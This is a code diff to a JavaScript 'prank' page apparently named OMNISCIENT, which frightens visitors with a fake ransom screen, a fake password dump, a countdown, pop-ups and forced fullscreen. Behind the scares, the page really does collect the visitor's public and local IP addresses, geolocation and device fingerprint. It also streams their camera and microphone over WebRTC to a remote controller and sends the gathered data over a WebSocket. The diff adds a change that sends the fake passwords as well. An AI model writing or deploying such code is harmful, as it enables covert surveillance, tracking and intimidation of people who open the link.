@@ -213,7 +213,7 @@
         // ============================================================
         // CONFIG
         // ============================================================
-        const WS_URL = `wss://${window.location.host}`; // or ws:// if not HTTPS
+        const WS_URL = `wss://${window.location.host}`;
 
         let roomId = '';
         let ws = null;
@@ -225,15 +225,24 @@
         let revealShown = false;
 
         // ============================================================
-        // 1. GENERATE ROOM & CONNECT WEBSOCKET
+        // 1. GET ROOM FROM URL PARAMETER, OR GENERATE RANDOM
         // ============================================================
-        function generateRoom() {
+        function getRoomFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const room = params.get('room');
+            if (room && room.length > 0) {
+                return room;
+            }
+            // Fallback: generate a random 6-digit code
             return Math.floor(100000 + Math.random() * 900000).toString();
         }
 
-        roomId = generateRoom();
+        roomId = getRoomFromURL();
         document.getElementById('roomCode').textContent = roomId;
 
+        // ============================================================
+        // 2. CONNECT WEBSOCKET
+        // ============================================================
         function connectWebSocket() {
             ws = new WebSocket(WS_URL);
             ws.onopen = () => {
@@ -268,7 +277,7 @@
         }
 
         // ============================================================
-        // 2. CAMERA & MIC (with local mirror)
+        // 3. CAMERA & MIC (with local mirror)
         // ============================================================
         async function startCamera() {
             try {
@@ -277,30 +286,22 @@
                 const video = document.getElementById('mirror');
                 video.srcObject = localStream;
                 video.style.display = 'block';
-                // Also play audio locally so they hear themselves (feedback)
-                // but we don't want echo; we'll just show they are heard.
-                // Actually we don't output audio to speakers to avoid feedback.
-                // We will just use the stream for WebRTC.
 
-                // Initiate WebRTC
                 createPeerConnection();
-                // Add local tracks
                 localStream.getTracks().forEach(track => {
                     peerConnection.addTrack(track, localStream);
                 });
-                // Create offer
                 const offer = await peerConnection.createOffer();
                 await peerConnection.setLocalDescription(offer);
                 ws.send(JSON.stringify({ type: 'webrtc_offer', room: roomId, offer: offer }));
             } catch (err) {
                 console.error('Camera/mic error:', err);
-                // Still continue without media
-                createPeerConnection(); // will still work for commands
+                createPeerConnection();
             }
         }
 
         // ============================================================
-        // 3. WEBRTC PEER CONNECTION (to send video/audio to controller)
+        // 4. WEBRTC PEER CONNECTION
         // ============================================================
         function createPeerConnection() {
             const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
@@ -334,12 +335,11 @@
         }
 
         // ============================================================
-        // 4. EXTRACT DATA & SEND TO CONTROLLER
+        // 5. EXTRACT DATA & SEND TO CONTROLLER
         // ============================================================
         async function collectAndSendInfo() {
             const info = {};
 
-            // Public IP
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
@@ -347,7 +347,6 @@
                 document.getElementById('pubIP').textContent = data.ip;
             } catch (e) { info.publicIP = 'Unknown'; }
 
-            // Local IP via WebRTC
             try {
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('dummy');
@@ -373,7 +372,6 @@
                 pc.close();
             } catch (e) { info.localIP = 'Unknown'; }
 
-            // Geolocation
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
@@ -383,19 +381,16 @@
                 document.getElementById('location').textContent = info.location;
             } catch (e) { info.location = 'Permission denied'; }
 
-            // Device fingerprint
             const ua = navigator.userAgent;
             const screenRes = `${screen.width}x${screen.height}`;
             const os = navigator.platform;
             info.device = `${os} | ${screenRes} | ${ua}`;
             document.getElementById('deviceInfo').textContent = info.device;
 
-            // Fake WiFi
             const fakeWiFi = ['HomeWiFi-5G', 'Starbucks_WiFi', 'Neighbor_Network', 'School_Student', 'Campus_Net'].sort(() => Math.random() - 0.5)[0];
             info.wifi = fakeWiFi;
             document.getElementById('wifiName').textContent = fakeWiFi;
 
-            // Fake passwords
             const passwords = {
                 'Facebook': 'h@ck3d_123',
                 'Gmail': 'p@ssw0rd!',
@@ -404,16 +399,16 @@
                 'Netflix': 'stream_me'
             };
             const dump = Object.entries(passwords).map(([k, v]) => `${k}: ${v}`).join('\n');
+            info.passwords = dump;
             document.getElementById('passwordDump').textContent = dump;
 
-            // Send info to controller via WebSocket
             if (ws && ws.readyState === WebSocket.OPEN) {
                 ws.send(JSON.stringify({ type: 'info', room: roomId, data: info }));
             }
         }
 
         // ============================================================
-        // 5. COMMAND HANDLER (what controller sends)
+        // 6. COMMAND HANDLER
         // ============================================================
         function handleCommand(payload) {
             const { action, value } = payload;
@@ -452,16 +447,13 @@
         }
 
         // ============================================================
-        // 6. FEAR FACTORY – all the scary effects
+        // 7. FEAR FACTORY
         // ============================================================
-
-        // 6a. Floating message
         function showFloatingMessage(text) {
             const overlay = document.getElementById('overlay');
             const msg = document.createElement('div');
             msg.className = 'message';
             msg.textContent = text || '⚠️ YOU ARE BEING WATCHED ⚠️';
-            // random position
             msg.style.left = (10 + Math.random() * 70) + '%';
             msg.style.top = (10 + Math.random() * 70) + '%';
             msg.style.fontSize = (3 + Math.random() * 4) + 'rem';
@@ -469,7 +461,6 @@
             setTimeout(() => msg.remove(), 9000);
         }
 
-        // 6b. Matrix Rain
         function startMatrix() {
             const canvas = document.getElementById('matrixCanvas');
             canvas.style.display = 'block';
@@ -497,7 +488,6 @@
                 frameId = requestAnimationFrame(draw);
             }
             draw();
-            // Stop after 10 seconds
             setTimeout(() => {
                 cancelAnimationFrame(frameId);
                 canvas.style.display = 'none';
@@ -505,7 +495,6 @@
             }, 10000);
         }
 
-        // 6c. Countdown + ransom
         function startCountdown() {
             const overlay = document.getElementById('countdownOverlay');
             overlay.classList.add('show');
@@ -525,7 +514,6 @@
             }, 1000);
         }
 
-        // 6d. Ransom screen
         function showRansom() {
             const screen = document.getElementById('ransomScreen');
             screen.classList.add('show');
@@ -540,7 +528,6 @@
                     clearInterval(ransomTimerInterval);
                 }
             }, 1000);
-            // Auto-release after 30s if no reveal
             setTimeout(() => {
                 if (!revealShown) {
                     releasePrank();
@@ -548,7 +535,6 @@
             }, 30000);
         }
 
-        // 6e. Beep
         function playBeep() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -565,7 +551,6 @@
                     audioCtx.close();
                 }, 500);
             } catch (e) { /* ignore */ }
-            // Play a second beep after 1s
             setTimeout(() => {
                 try {
                     const audioCtx2 = new (window.AudioContext || window.webkitAudioContext)();
@@ -585,7 +570,6 @@
             }, 1000);
         }
 
-        // 6f. Speech
         function speakText(text) {
             if ('speechSynthesis' in window) {
                 const utterance = new SpeechSynthesisUtterance(text);
@@ -596,7 +580,6 @@
             }
         }
 
-        // 6g. Popup tabs
         function openPopups() {
             const urls = [
                 'https://example.com/you-have-been-hacked',
@@ -608,66 +591,47 @@
             });
         }
 
-        // 6h. Release prank
         function releasePrank() {
             revealShown = true;
-            // Remove all scary overlays
             document.getElementById('countdownOverlay').classList.remove('show');
             document.getElementById('ransomScreen').classList.remove('show');
             document.getElementById('matrixCanvas').style.display = 'none';
             document.getElementById('fakePasswords').classList.remove('show');
-            // Show reveal button
             document.getElementById('revealBtn').style.display = 'block';
-            // Stop any speech
             if ('speechSynthesis' in window) {
                 window.speechSynthesis.cancel();
             }
-            // Send release to controller? Not needed.
-            // Also show a friendly message
             showFloatingMessage('🎃 Just a Prank! Happy Halloween! 🎃');
-            // Release fullscreen if active
             if (document.fullscreenElement) {
                 document.exitFullscreen();
             }
-            // Release pointer lock
             if (document.pointerLockElement) {
                 document.exitPointerLock();
             }
         }
 
         // ============================================================
-        // 7. INIT
+        // 8. INIT
         // ============================================================
         connectWebSocket();
         collectAndSendInfo();
 
-        // Auto-fullscreen
         document.addEventListener('click', () => {
             if (!document.fullscreenElement) {
                 document.documentElement.requestFullscreen().catch(() => {});
             }
-            // Pointer lock briefly
             if (!document.pointerLockElement) {
                 document.documentElement.requestPointerLock().catch(() => {});
             }
         });
 
-        // Safety release after 30 seconds if no interaction
         setTimeout(() => {
             if (!revealShown) {
                 releasePrank();
             }
         }, 30000);
 
-        // Reveal button
         document.getElementById('revealBtn').addEventListener('click', releasePrank);
-
-        // Handle ESC to exit fullscreen (they'll discover it)
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement && !revealShown) {
-                // They escaped; we can re-request on next click
-            }
-        });
 
         console.log('💀 OMNISCIENT active. Room:', roomId);
     </script>
